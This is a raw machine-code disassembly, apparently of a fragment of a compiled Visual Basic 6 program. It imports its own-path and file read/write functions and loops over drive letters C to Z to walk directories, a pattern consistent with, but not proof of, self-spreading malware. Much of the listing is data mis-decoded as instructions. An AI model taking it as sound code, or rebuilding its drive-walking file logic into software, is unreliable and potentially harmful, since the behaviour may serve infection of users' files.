  402a02:	76 62                	jbe    0x402a66
  402a04:	61                   	popa
  402a05:	48                   	dec    %eax
  402a06:	72 65                	jb     0x402a6d
  402a08:	73 75                	jae    0x402a7f
  402a0a:	6c                   	insb   (%dx),%es:(%edi)
  402a0b:	74 43                	je     0x402a50
  402a0d:	68 65 63 6b 4f       	push   $0x4f6b6365
  402a12:	62 6a 00             	bound  %ebp,0x0(%edx)
  402a15:	00 00                	add    %al,(%eax)
  402a17:	00 09                	add    %cl,(%ecx)
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	00 6b 65             	add    %ch,0x65(%ebx)
  402a1e:	72 6e                	jb     0x402a8e
  402a20:	65 6c                	gs insb (%dx),%es:(%edi)
  402a22:	33 32                	xor    (%edx),%esi
  402a24:	00 00                	add    %al,(%eax)
  402a26:	00 00                	add    %al,(%eax)
  402a28:	13 00                	adc    (%eax),%eax
  402a2a:	00 00                	add    %al,(%eax)
  402a2c:	47                   	inc    %edi
  402a2d:	65 74 4d             	gs je  0x402a7d
  402a30:	6f                   	outsl  %ds:(%esi),(%dx)
  402a31:	64 75 6c             	fs jne 0x402aa0
  402a34:	65 46                	gs inc %esi
  402a36:	69 6c 65 4e 61 6d 65 	imul   $0x41656d61,0x4e(%ebp,%eiz,2),%ebp
  402a3d:	41 
  402a3e:	00 00                	add    %al,(%eax)
  402a40:	1c 2a                	sbb    $0x2a,%al
  402a42:	40                   	inc    %eax
  402a43:	00 2c 2a             	add    %ch,(%edx,%ebp,1)
  402a46:	40                   	inc    %eax
  402a47:	00 00                	add    %al,(%eax)
  402a49:	00 04 00             	add    %al,(%eax,%eax,1)
  402a4c:	04 54                	add    $0x54,%al
  402a4e:	40                   	inc    %eax
	...
  402a57:	00 a1 0c 54 40 00    	add    %ah,0x40540c(%ecx)
  402a5d:	0b c0                	or     %eax,%eax
  402a5f:	74 02                	je     0x402a63
  402a61:	ff e0                	jmp    *%eax
  402a63:	68 40 2a 40 00       	push   $0x402a40
  402a68:	b8 dc 12 40 00       	mov    $0x4012dc,%eax
  402a6d:	ff d0                	call   *%eax
  402a6f:	ff e0                	jmp    *%eax
  402a71:	00 00                	add    %al,(%eax)
  402a73:	00 02                	add    %al,(%edx)
  402a75:	00 00                	add    %al,(%eax)
  402a77:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402a7b:	00 02                	add    %al,(%edx)
  402a7d:	00 00                	add    %al,(%eax)
  402a7f:	00 2e                	add    %ch,(%esi)
  402a81:	00 00                	add    %al,(%eax)
  402a83:	00 04 00             	add    %al,(%eax,%eax,1)
  402a86:	00 00                	add    %al,(%eax)
  402a88:	2e 00 2e             	add    %ch,%cs:(%esi)
  402a8b:	00 00                	add    %al,(%eax)
  402a8d:	00 00                	add    %al,(%eax)
  402a8f:	00 5f 5f             	add    %bl,0x5f(%edi)
  402a92:	76 62                	jbe    0x402af6
  402a94:	61                   	popa
  402a95:	4c                   	dec    %esp
  402a96:	73 65                	jae    0x402afd
  402a98:	74 46                	je     0x402ae0
  402a9a:	69 78 73 74 72 00 5f 	imul   $0x5f007274,0x73(%eax),%edi
  402aa1:	5f                   	pop    %edi
  402aa2:	76 62                	jbe    0x402b06
  402aa4:	61                   	popa
  402aa5:	53                   	push   %ebx
  402aa6:	65 74 53             	gs je  0x402afc
  402aa9:	79 73                	jns    0x402b1e
  402aab:	74 65                	je     0x402b12
  402aad:	6d                   	insl   (%dx),%es:(%edi)
  402aae:	45                   	inc    %ebp
  402aaf:	72 72                	jb     0x402b23
  402ab1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ab2:	72 00                	jb     0x402ab4
  402ab4:	5f                   	pop    %edi
  402ab5:	5f                   	pop    %edi
  402ab6:	76 62                	jbe    0x402b1a
  402ab8:	61                   	popa
  402ab9:	53                   	push   %ebx
  402aba:	74 72                	je     0x402b2e
  402abc:	54                   	push   %esp
  402abd:	6f                   	outsl  %ds:(%esi),(%dx)
  402abe:	41                   	inc    %ecx
  402abf:	6e                   	outsb  %ds:(%esi),(%dx)
  402ac0:	73 69                	jae    0x402b2b
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	5f                   	pop    %edi
  402ac5:	5f                   	pop    %edi
  402ac6:	76 62                	jbe    0x402b2a
  402ac8:	61                   	popa
  402ac9:	49                   	dec    %ecx
  402aca:	32 49 34             	xor    0x34(%ecx),%cl
  402acd:	00 00                	add    %al,(%eax)
  402acf:	00 5f 5f             	add    %bl,0x5f(%edi)
  402ad2:	76 62                	jbe    0x402b36
  402ad4:	61                   	popa
  402ad5:	46                   	inc    %esi
  402ad6:	69 78 73 74 72 43 6f 	imul   $0x6f437274,0x73(%eax),%edi
  402add:	6e                   	outsb  %ds:(%esi),(%dx)
  402ade:	73 74                	jae    0x402b54
  402ae0:	72 75                	jb     0x402b57
  402ae2:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	5f                   	pop    %edi
  402ae9:	5f                   	pop    %edi
  402aea:	76 62                	jbe    0x402b4e
  402aec:	61                   	popa
  402aed:	4c                   	dec    %esp
  402aee:	65 6e                	outsb  %gs:(%esi),(%dx)
  402af0:	42                   	inc    %edx
  402af1:	73 74                	jae    0x402b67
  402af3:	72 00                	jb     0x402af5
  402af5:	00 00                	add    %al,(%eax)
  402af7:	00 5f 5f             	add    %bl,0x5f(%edi)
  402afa:	76 62                	jbe    0x402b5e
  402afc:	61                   	popa
  402afd:	41                   	inc    %ecx
  402afe:	72 79                	jb     0x402b79
  402b00:	44                   	inc    %esp
  402b01:	65 73 74             	gs jae 0x402b78
  402b04:	72 75                	jb     0x402b7b
  402b06:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  402b0a:	00 00                	add    %al,(%eax)
  402b0c:	5f                   	pop    %edi
  402b0d:	5f                   	pop    %edi
  402b0e:	76 62                	jbe    0x402b72
  402b10:	61                   	popa
  402b11:	52                   	push   %edx
  402b12:	65 64 69 6d 00 00 5f 	gs imul $0x765f5f00,%fs:0x0(%ebp),%ebp
  402b19:	5f 76 
  402b1b:	62 61 56             	bound  %esp,0x56(%ecx)
  402b1e:	61                   	popa
  402b1f:	72 54                	jb     0x402b75
  402b21:	73 74                	jae    0x402b97
  402b23:	45                   	inc    %ebp
  402b24:	71 00                	jno    0x402b26
  402b26:	00 00                	add    %al,(%eax)
  402b28:	5f                   	pop    %edi
  402b29:	5f                   	pop    %edi
  402b2a:	76 62                	jbe    0x402b8e
  402b2c:	61                   	popa
  402b2d:	47                   	inc    %edi
  402b2e:	65 6e                	outsb  %gs:(%esi),(%dx)
  402b30:	65 72 61             	gs jb  0x402b94
  402b33:	74 65                	je     0x402b9a
  402b35:	42                   	inc    %edx
  402b36:	6f                   	outsl  %ds:(%esi),(%dx)
  402b37:	75 6e                	jne    0x402ba7
  402b39:	64 73 45             	fs jae 0x402b81
  402b3c:	72 72                	jb     0x402bb0
  402b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3f:	72 00                	jb     0x402b41
  402b41:	00 00                	add    %al,(%eax)
  402b43:	00 5f 5f             	add    %bl,0x5f(%edi)
  402b46:	76 62                	jbe    0x402baa
  402b48:	61                   	popa
  402b49:	52                   	push   %edx
  402b4a:	65 64 69 6d 50 72 65 	gs imul $0x65736572,%fs:0x50(%ebp),%ebp
  402b51:	73 65 
  402b53:	72 76                	jb     0x402bcb
  402b55:	65 00 00             	add    %al,%gs:(%eax)
  402b58:	5f                   	pop    %edi
  402b59:	5f                   	pop    %edi
  402b5a:	76 62                	jbe    0x402bbe
  402b5c:	61                   	popa
  402b5d:	46                   	inc    %esi
  402b5e:	72 65                	jb     0x402bc5
  402b60:	65 53                	gs push %ebx
  402b62:	74 72                	je     0x402bd6
  402b64:	00 00                	add    %al,(%eax)
  402b66:	00 00                	add    %al,(%eax)
  402b68:	5f                   	pop    %edi
  402b69:	5f                   	pop    %edi
  402b6a:	76 62                	jbe    0x402bce
  402b6c:	61                   	popa
  402b6d:	53                   	push   %ebx
  402b6e:	74 72                	je     0x402be2
  402b70:	43                   	inc    %ebx
  402b71:	6d                   	insl   (%dx),%es:(%edi)
  402b72:	70 00                	jo     0x402b74
  402b74:	5f                   	pop    %edi
  402b75:	5f                   	pop    %edi
  402b76:	76 62                	jbe    0x402bda
  402b78:	61                   	popa
  402b79:	53                   	push   %ebx
  402b7a:	74 72                	je     0x402bee
  402b7c:	43                   	inc    %ebx
  402b7d:	61                   	popa
  402b7e:	74 00                	je     0x402b80
  402b80:	5f                   	pop    %edi
  402b81:	5f                   	pop    %edi
  402b82:	76 62                	jbe    0x402be6
  402b84:	61                   	popa
  402b85:	53                   	push   %ebx
  402b86:	74 72                	je     0x402bfa
  402b88:	4d                   	dec    %ebp
  402b89:	6f                   	outsl  %ds:(%esi),(%dx)
  402b8a:	76 65                	jbe    0x402bf1
  402b8c:	00 00                	add    %al,(%eax)
  402b8e:	00 00                	add    %al,(%eax)
  402b90:	5f                   	pop    %edi
  402b91:	5f                   	pop    %edi
  402b92:	76 62                	jbe    0x402bf6
  402b94:	61                   	popa
  402b95:	46                   	inc    %esi
  402b96:	72 65                	jb     0x402bfd
  402b98:	65 56                	gs push %esi
  402b9a:	61                   	popa
  402b9b:	72 00                	jb     0x402b9d
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	00 5f 5f             	add    %bl,0x5f(%edi)
  402ba2:	76 62                	jbe    0x402c06
  402ba4:	61                   	popa
  402ba5:	56                   	push   %esi
  402ba6:	61                   	popa
  402ba7:	72 54                	jb     0x402bfd
  402ba9:	73 74                	jae    0x402c1f
  402bab:	4e                   	dec    %esi
  402bac:	65 00 00             	add    %al,%gs:(%eax)
  402baf:	00 5f 5f             	add    %bl,0x5f(%edi)
  402bb2:	76 62                	jbe    0x402c16
  402bb4:	61                   	popa
  402bb5:	4f                   	dec    %edi
  402bb6:	6e                   	outsb  %ds:(%esi),(%dx)
  402bb7:	45                   	inc    %ebp
  402bb8:	72 72                	jb     0x402c2c
  402bba:	6f                   	outsl  %ds:(%esi),(%dx)
  402bbb:	72 00                	jb     0x402bbd
  402bbd:	00 00                	add    %al,(%eax)
  402bbf:	00 16                	add    %dl,(%esi)
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	00 04 00             	add    %al,(%eax,%eax,1)
  402bc6:	00 00                	add    %al,(%eax)
  402bc8:	01 00                	add    %eax,(%eax)
	...
  402bd2:	73 01                	jae    0x402bd5
  402bd4:	ff                   	(bad)
  402bd5:	ff                   	(bad)
  402bd6:	ff                   	(bad)
  402bd7:	ff 01                	incl   (%ecx)
  402bd9:	00 00                	add    %al,(%eax)
  402bdb:	00 0a                	add    %cl,(%edx)
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	00 42 00             	add    %al,0x0(%edx)
  402be2:	59                   	pop    %ecx
  402be3:	00 3a                	add    %bh,(%edx)
  402be5:	00 0f                	add    %cl,(%edi)
  402be7:	5c                   	pop    %esp
  402be8:	8a 94 00 00 02 00 00 	mov    0x200(%eax,%eax,1),%dl
  402bef:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	5f                   	pop    %edi
  402bf5:	5f                   	pop    %edi
  402bf6:	76 62                	jbe    0x402c5a
  402bf8:	61                   	popa
  402bf9:	55                   	push   %ebp
  402bfa:	62 6f 75             	bound  %ebp,0x75(%edi)
  402bfd:	6e                   	outsb  %ds:(%esi),(%dx)
  402bfe:	64 00 5f 5f          	add    %bl,%fs:0x5f(%edi)
  402c02:	76 62                	jbe    0x402c66
  402c04:	61                   	popa
  402c05:	53                   	push   %ebx
  402c06:	74 72                	je     0x402c7a
  402c08:	49                   	dec    %ecx
  402c09:	34 00                	xor    $0x0,%al
  402c0b:	00 5f 5f             	add    %bl,0x5f(%edi)
  402c0e:	76 62                	jbe    0x402c72
  402c10:	61                   	popa
  402c11:	50                   	push   %eax
  402c12:	75 74                	jne    0x402c88
  402c14:	33 00                	xor    (%eax),%eax
  402c16:	00 00                	add    %al,(%eax)
  402c18:	5f                   	pop    %edi
  402c19:	5f                   	pop    %edi
  402c1a:	76 62                	jbe    0x402c7e
  402c1c:	61                   	popa
  402c1d:	50                   	push   %eax
  402c1e:	75 74                	jne    0x402c94
  402c20:	4f                   	dec    %edi
  402c21:	77 6e                	ja     0x402c91
  402c23:	65 72 33             	gs jb  0x402c59
  402c26:	00 00                	add    %al,(%eax)
  402c28:	5f                   	pop    %edi
  402c29:	5f                   	pop    %edi
  402c2a:	76 62                	jbe    0x402c8e
  402c2c:	61                   	popa
  402c2d:	49                   	dec    %ecx
  402c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  402c2f:	53                   	push   %ebx
  402c30:	74 72                	je     0x402ca4
  402c32:	56                   	push   %esi
  402c33:	61                   	popa
  402c34:	72 00                	jb     0x402c36
  402c36:	00 00                	add    %al,(%eax)
  402c38:	5f                   	pop    %edi
  402c39:	5f                   	pop    %edi
  402c3a:	76 62                	jbe    0x402c9e
  402c3c:	61                   	popa
  402c3d:	56                   	push   %esi
  402c3e:	61                   	popa
  402c3f:	72 54                	jb     0x402c95
  402c41:	73 74                	jae    0x402cb7
  402c43:	47                   	inc    %edi
  402c44:	74 00                	je     0x402c46
  402c46:	00 00                	add    %al,(%eax)
  402c48:	5f                   	pop    %edi
  402c49:	5f                   	pop    %edi
  402c4a:	76 62                	jbe    0x402cae
  402c4c:	61                   	popa
  402c4d:	46                   	inc    %esi
  402c4e:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  402c55:	65 
  402c56:	00 00                	add    %al,(%eax)
  402c58:	5f                   	pop    %edi
  402c59:	5f                   	pop    %edi
  402c5a:	76 62                	jbe    0x402cbe
  402c5c:	61                   	popa
  402c5d:	47                   	inc    %edi
  402c5e:	65 74 4f             	gs je  0x402cb0
  402c61:	77 6e                	ja     0x402cd1
  402c63:	65 72 33             	gs jb  0x402c99
  402c66:	00 00                	add    %al,(%eax)
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	00 00                	add    %al,(%eax)
  402c6c:	5f                   	pop    %edi
  402c6d:	5f                   	pop    %edi
  402c6e:	76 62                	jbe    0x402cd2
  402c70:	61                   	popa
  402c71:	46                   	inc    %esi
  402c72:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  402c79:	00 
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	00 00                	add    %al,(%eax)
  402c7e:	00 00                	add    %al,(%eax)
  402c80:	c4 2c 40             	les    (%eax,%eax,2),%ebp
  402c83:	00 ff                	add    %bh,%bh
  402c85:	ff                   	(bad)
  402c86:	ff                   	(bad)
  402c87:	ff                   	(bad)
  402c88:	ff                   	(bad)
  402c89:	ff                   	(bad)
  402c8a:	ff                   	(bad)
  402c8b:	ff                   	(bad)
  402c8c:	ff                   	(bad)
  402c8d:	ff                   	(bad)
  402c8e:	ff                   	(bad)
  402c8f:	ff 00                	incl   (%eax)
  402c91:	00 00                	add    %al,(%eax)
  402c93:	00 cc                	add    %cl,%ah
  402c95:	26 40                	es inc %eax
  402c97:	00 ff                	add    %bh,%bh
  402c99:	ff                   	(bad)
  402c9a:	ff                   	(bad)
  402c9b:	ff 00                	incl   (%eax)
  402c9d:	00 00                	add    %al,(%eax)
  402c9f:	00 80 2c 40 00 00    	add    %al,0x402c(%eax)
	...
  402cad:	00 00                	add    %al,(%eax)
  402caf:	00 ff                	add    %bh,%bh
  402cb1:	ff                   	(bad)
  402cb2:	ff                   	(bad)
  402cb3:	ff 00                	incl   (%eax)
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	00 a8 28 40 00 58    	add    %ch,0x58004028(%eax)
  402cbd:	28 40 00             	sub    %al,0x0(%eax)
  402cc0:	10 54 40 00          	adc    %dl,0x0(%eax,%eax,2)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	40                   	inc    %eax
  402cc9:	23 40 00             	and    0x0(%eax),%eax
  402ccc:	ff                   	(bad)
  402ccd:	ff                   	(bad)
  402cce:	ff                   	(bad)
  402ccf:	ff 00                	incl   (%eax)
	...
  402cd9:	00 00                	add    %al,(%eax)
  402cdb:	00 7c 2c 40          	add    %bh,0x40(%esp,%ebp,1)
  402cdf:	00 00                	add    %al,(%eax)
  402ce1:	00 00                	add    %al,(%eax)
  402ce3:	00 7c 2c 40          	add    %bh,0x40(%esp,%ebp,1)
  402ce7:	00 7c 2c 40          	add    %bh,0x40(%esp,%ebp,1)
  402ceb:	00 7c 2c 40          	add    %bh,0x40(%esp,%ebp,1)
	...
  402cfb:	00 40 00             	add    %al,0x0(%eax)
  402cfe:	00 00                	add    %al,(%eax)
  402d00:	04 00                	add    $0x0,%al
  402d02:	00 00                	add    %al,(%eax)
  402d04:	cc                   	int3
  402d05:	cc                   	int3
  402d06:	cc                   	int3
  402d07:	cc                   	int3
  402d08:	cc                   	int3
  402d09:	cc                   	int3
  402d0a:	cc                   	int3
  402d0b:	cc                   	int3
  402d0c:	cc                   	int3
  402d0d:	cc                   	int3
  402d0e:	cc                   	int3
  402d0f:	cc                   	int3
  402d10:	e9 e9 e9 e9 cc       	jmp    0xcd2a16fe
  402d15:	cc                   	int3
  402d16:	cc                   	int3
  402d17:	cc                   	int3
  402d18:	cc                   	int3
  402d19:	cc                   	int3
  402d1a:	cc                   	int3
  402d1b:	cc                   	int3
  402d1c:	cc                   	int3
  402d1d:	cc                   	int3
  402d1e:	cc                   	int3
  402d1f:	cc                   	int3
  402d20:	55                   	push   %ebp
  402d21:	8b ec                	mov    %esp,%ebp
  402d23:	83 ec 0c             	sub    $0xc,%esp
  402d26:	68 16 12 40 00       	push   $0x401216
  402d2b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402d31:	50                   	push   %eax
  402d32:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402d39:	83 ec 60             	sub    $0x60,%esp
  402d3c:	53                   	push   %ebx
  402d3d:	56                   	push   %esi
  402d3e:	57                   	push   %edi
  402d3f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  402d42:	c7 45 f8 38 11 40 00 	movl   $0x401138,-0x8(%ebp)
  402d49:	8b 75 08             	mov    0x8(%ebp),%esi
  402d4c:	8b c6                	mov    %esi,%eax
  402d4e:	83 e0 01             	and    $0x1,%eax
  402d51:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402d54:	83 e6 fe             	and    $0xfffffffe,%esi
  402d57:	56                   	push   %esi
  402d58:	89 75 08             	mov    %esi,0x8(%ebp)
  402d5b:	8b 0e                	mov    (%esi),%ecx
  402d5d:	ff 51 04             	call   *0x4(%ecx)
  402d60:	8b 16                	mov    (%esi),%edx
  402d62:	33 ff                	xor    %edi,%edi
  402d64:	57                   	push   %edi
  402d65:	56                   	push   %esi
  402d66:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  402d69:	89 7d e0             	mov    %edi,-0x20(%ebp)
  402d6c:	89 7d dc             	mov    %edi,-0x24(%ebp)
  402d6f:	89 7d cc             	mov    %edi,-0x34(%ebp)
  402d72:	89 7d bc             	mov    %edi,-0x44(%ebp)
  402d75:	89 7d ac             	mov    %edi,-0x54(%ebp)
  402d78:	ff 92 bc 01 00 00    	call   *0x1bc(%edx)
  402d7e:	3b c7                	cmp    %edi,%eax
  402d80:	db e2                	fnclex
  402d82:	7d 16                	jge    0x402d9a
  402d84:	8b 1d 3c 10 40 00    	mov    0x40103c,%ebx
  402d8a:	68 bc 01 00 00       	push   $0x1bc
  402d8f:	68 18 28 40 00       	push   $0x402818
  402d94:	56                   	push   %esi
  402d95:	50                   	push   %eax
  402d96:	ff d3                	call   *%ebx
  402d98:	eb 06                	jmp    0x402da0
  402d9a:	8b 1d 3c 10 40 00    	mov    0x40103c,%ebx
  402da0:	39 3d 00 54 40 00    	cmp    %edi,0x405400
  402da6:	75 10                	jne    0x402db8
  402da8:	68 00 54 40 00       	push   $0x405400
  402dad:	68 fc 28 40 00       	push   $0x4028fc
  402db2:	ff 15 e0 10 40 00    	call   *0x4010e0
  402db8:	8b 35 00 54 40 00    	mov    0x405400,%esi
  402dbe:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402dc1:	51                   	push   %ecx
  402dc2:	56                   	push   %esi
  402dc3:	8b 06                	mov    (%esi),%eax
  402dc5:	ff 50 14             	call   *0x14(%eax)
  402dc8:	3b c7                	cmp    %edi,%eax
  402dca:	db e2                	fnclex
  402dcc:	7d 0b                	jge    0x402dd9
  402dce:	6a 14                	push   $0x14
  402dd0:	68 ec 28 40 00       	push   $0x4028ec
  402dd5:	56                   	push   %esi
  402dd6:	50                   	push   %eax
  402dd7:	ff d3                	call   *%ebx
  402dd9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402ddc:	57                   	push   %edi
  402ddd:	50                   	push   %eax
  402dde:	8b f0                	mov    %eax,%esi
  402de0:	8b 10                	mov    (%eax),%edx
  402de2:	ff 52 7c             	call   *0x7c(%edx)
  402de5:	3b c7                	cmp    %edi,%eax
  402de7:	db e2                	fnclex
  402de9:	7d 0b                	jge    0x402df6
  402deb:	6a 7c                	push   $0x7c
  402ded:	68 0c 29 40 00       	push   $0x40290c
  402df2:	56                   	push   %esi
  402df3:	50                   	push   %eax
  402df4:	ff d3                	call   *%ebx
  402df6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402df9:	ff 15 2c 11 40 00    	call   *0x40112c
  402dff:	8b 3d b0 10 40 00    	mov    0x4010b0,%edi
  402e05:	8b 1d ec 10 40 00    	mov    0x4010ec,%ebx
  402e0b:	c7 45 98 01 00 00 00 	movl   $0x1,-0x68(%ebp)
  402e12:	be 43 00 00 00       	mov    $0x43,%esi
  402e17:	b8 5a 00 00 00       	mov    $0x5a,%eax
  402e1c:	3b f0                	cmp    %eax,%esi
  402e1e:	7f 74                	jg     0x402e94
  402e20:	8d 45 cc             	lea    -0x34(%ebp),%eax
  402e23:	56                   	push   %esi
  402e24:	50                   	push   %eax
  402e25:	ff d7                	call   *%edi
  402e27:	ba 2c 29 40 00       	mov    $0x40292c,%edx
  402e2c:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402e2f:	ff d3                	call   *%ebx
  402e31:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402e34:	8d 55 cc             	lea    -0x34(%ebp),%edx
  402e37:	51                   	push   %ecx
  402e38:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402e3b:	52                   	push   %edx
  402e3c:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402e3f:	50                   	push   %eax
  402e40:	51                   	push   %ecx
  402e41:	c7 45 b4 20 29 40 00 	movl   $0x402920,-0x4c(%ebp)
  402e48:	c7 45 ac 08 00 00 00 	movl   $0x8,-0x54(%ebp)
  402e4f:	ff 15 cc 10 40 00    	call   *0x4010cc
  402e55:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  402e58:	50                   	push   %eax
  402e59:	52                   	push   %edx
  402e5a:	ff 15 c8 10 40 00    	call   *0x4010c8
  402e60:	50                   	push   %eax
  402e61:	e8 9a 00 00 00       	call   0x402f00
  402e66:	8d 45 e0             	lea    -0x20(%ebp),%eax
  402e69:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  402e6c:	50                   	push   %eax
  402e6d:	51                   	push   %ecx
  402e6e:	6a 02                	push   $0x2
  402e70:	ff 15 f0 10 40 00    	call   *0x4010f0
  402e76:	8d 55 bc             	lea    -0x44(%ebp),%edx
  402e79:	8d 45 cc             	lea    -0x34(%ebp),%eax
  402e7c:	52                   	push   %edx
  402e7d:	50                   	push   %eax
  402e7e:	6a 02                	push   $0x2
  402e80:	ff 15 20 10 40 00    	call   *0x401020
  402e86:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  402e89:	83 c4 18             	add    $0x18,%esp
  402e8c:	03 ce                	add    %esi,%ecx
  402e8e:	70 62                	jo     0x402ef2
  402e90:	8b f1                	mov    %ecx,%esi
  402e92:	eb 83                	jmp    0x402e17
  402e94:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402e9b:	68 d3 2e 40 00       	push   $0x402ed3
  402ea0:	eb 30                	jmp    0x402ed2
  402ea2:	8d 55 e0             	lea    -0x20(%ebp),%edx
  402ea5:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  402ea8:	52                   	push   %edx
  402ea9:	50                   	push   %eax
  402eaa:	6a 02                	push   $0x2
  402eac:	ff 15 f0 10 40 00    	call   *0x4010f0
  402eb2:	83 c4 0c             	add    $0xc,%esp
  402eb5:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402eb8:	ff 15 2c 11 40 00    	call   *0x40112c
  402ebe:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402ec1:	8d 55 cc             	lea    -0x34(%ebp),%edx
  402ec4:	51                   	push   %ecx
  402ec5:	52                   	push   %edx
  402ec6:	6a 02                	push   $0x2
  402ec8:	ff 15 20 10 40 00    	call   *0x401020
  402ece:	83 c4 0c             	add    $0xc,%esp
  402ed1:	c3                   	ret
  402ed2:	c3                   	ret
  402ed3:	8b 45 08             	mov    0x8(%ebp),%eax
  402ed6:	50                   	push   %eax
  402ed7:	8b 08                	mov    (%eax),%ecx
  402ed9:	ff 51 08             	call   *0x8(%ecx)
  402edc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402edf:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402ee2:	5f                   	pop    %edi
  402ee3:	5e                   	pop    %esi
  402ee4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402eeb:	5b                   	pop    %ebx
  402eec:	8b e5                	mov    %ebp,%esp
  402eee:	5d                   	pop    %ebp
  402eef:	c2 04 00             	ret    $0x4
  402ef2:	ff 15 d8 10 40 00    	call   *0x4010d8
  402ef8:	90                   	nop
  402ef9:	90                   	nop
  402efa:	90                   	nop
  402efb:	90                   	nop
  402efc:	90                   	nop
  402efd:	90                   	nop
  402efe:	90                   	nop
  402eff:	90                   	nop
  402f00:	55                   	push   %ebp
  402f01:	8b ec                	mov    %esp,%ebp
  402f03:	83 ec 18             	sub    $0x18,%esp
  402f06:	68 16 12 40 00       	push   $0x401216
  402f0b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402f11:	50                   	push   %eax
  402f12:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402f19:	b8 bc 00 00 00       	mov    $0xbc,%eax
  402f1e:	e8 ed e2 ff ff       	call   0x401210
  402f23:	53                   	push   %ebx
  402f24:	56                   	push   %esi
  402f25:	57                   	push   %edi
  402f26:	89 65 e8             	mov    %esp,-0x18(%ebp)
  402f29:	c7 45 ec 48 11 40 00 	movl   $0x401148,-0x14(%ebp)
  402f30:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402f37:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  402f3e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402f45:	8b 55 08             	mov    0x8(%ebp),%edx
  402f48:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402f4b:	ff 15 ec 10 40 00    	call   *0x4010ec
  402f51:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  402f58:	6a ff                	push   $0xffffffff
  402f5a:	ff 15 48 10 40 00    	call   *0x401048
  402f60:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  402f67:	8d 45 c8             	lea    -0x38(%ebp),%eax
  402f6a:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  402f70:	c7 85 64 ff ff ff 08 	movl   $0x4008,-0x9c(%ebp)
  402f77:	40 00 00 
  402f7a:	6a 01                	push   $0x1
  402f7c:	8d 8d 64 ff ff ff    	lea    -0x9c(%ebp),%ecx
  402f82:	51                   	push   %ecx
  402f83:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  402f86:	52                   	push   %edx
  402f87:	ff 15 18 11 40 00    	call   *0x401118
  402f8d:	c7 85 5c ff ff ff 78 	movl   $0x402a78,-0xa4(%ebp)
  402f94:	2a 40 00 
  402f97:	c7 85 54 ff ff ff 08 	movl   $0x8008,-0xac(%ebp)
  402f9e:	80 00 00 
  402fa1:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  402fa4:	50                   	push   %eax
  402fa5:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  402fab:	51                   	push   %ecx
  402fac:	ff 15 04 11 40 00    	call   *0x401104
  402fb2:	66 89 85 50 ff ff ff 	mov    %ax,-0xb0(%ebp)
  402fb9:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  402fbc:	ff 15 10 10 40 00    	call   *0x401010
  402fc2:	0f bf 95 50 ff ff ff 	movswl -0xb0(%ebp),%edx
  402fc9:	85 d2                	test   %edx,%edx
  402fcb:	74 21                	je     0x402fee
  402fcd:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  402fd4:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402fd7:	50                   	push   %eax
  402fd8:	68 78 2a 40 00       	push   $0x402a78
  402fdd:	ff 15 30 10 40 00    	call   *0x401030
  402fe3:	8b d0                	mov    %eax,%edx
  402fe5:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402fe8:	ff 15 14 11 40 00    	call   *0x401114
  402fee:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  402ff5:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402ff8:	89 8d 6c ff ff ff    	mov    %ecx,-0x94(%ebp)
